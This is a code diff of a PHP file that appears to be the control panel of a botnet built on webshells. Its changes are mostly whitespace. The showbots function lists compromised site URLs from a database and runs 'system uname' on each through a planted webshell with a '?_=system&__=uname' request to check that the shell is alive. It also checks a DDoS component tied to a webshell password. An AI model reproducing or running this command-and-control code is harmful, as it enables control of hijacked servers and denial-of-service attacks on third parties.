@@ -135,17 +135,17 @@ return $response;
 }
 
 function showbots() {
-$conn = new mysqli(SQL_HOST, SQL_USER, SQL_PWD, SQL_DB);
-mysqli_select_db($conn,SQL_DB );
+	$conn = new mysqli(SQL_HOST, SQL_USER, SQL_PWD, SQL_DB);
+	mysqli_select_db($conn,SQL_DB );
 
-$data = mysqli_query($conn,"SELECT * FROM `bots`") or die("Shits fuckd up - ".mysql_error());
-echo '<table style="width: 60%; margin-left: auto; margin-right: auto; border-spacing: 5px;">';
-echo '<tr><td><b>ID</b></td><td><b>URL</b></td><td><b>DDOS</b></td><td><b>STATUS</b></td></tr>';
-while($row = mysqli_fetch_assoc($data)) {
+	$data = mysqli_query($conn,"SELECT * FROM `bots`") or die("Shits fuckd up - ".mysql_error());
+	echo '<table style="width: 60%; margin-left: auto; margin-right: auto; border-spacing: 5px;">';
+	echo '<tr><td><b>ID</b></td><td><b>URL</b></td><td><b>DDOS</b></td><td><b>STATUS</b></td></tr>';
+	while($row = mysqli_fetch_assoc($data)) {
     
-$source = conn($row['url'].'?_=system&__=uname');
-if(strpos($source, md5(666))) {
-$status = 'OK';
+		$source = conn($row['url'].'?_=system&__=uname');
+		if(strpos($source, md5(666))) {
+			$status = 'OK';
 } else {
 $status = 'BAD';
 }
@@ -155,7 +155,7 @@ if(strpos($source, md5(WEBSHELL_PASS . date("h:d")))) {
     $statdos = 'BAD';
 }
     
-echo '<tr><td>'.$row["id"].'.</td><td>'.$row["url"].'</td><td>'.$status.'</td><td>'.$statdos.'</td></tr>';
+echo '<tr><td>'.$row["id"].'.</td><td>'.$row["url"].'</td><td> A'.$status.'</td><td>'.$statdos.'</td></tr>';
 }
 echo '</table>';
 
@@ -1932,3 +1932,4 @@ mysqli_close($conn);
 checksql();
 
 ?>
+	
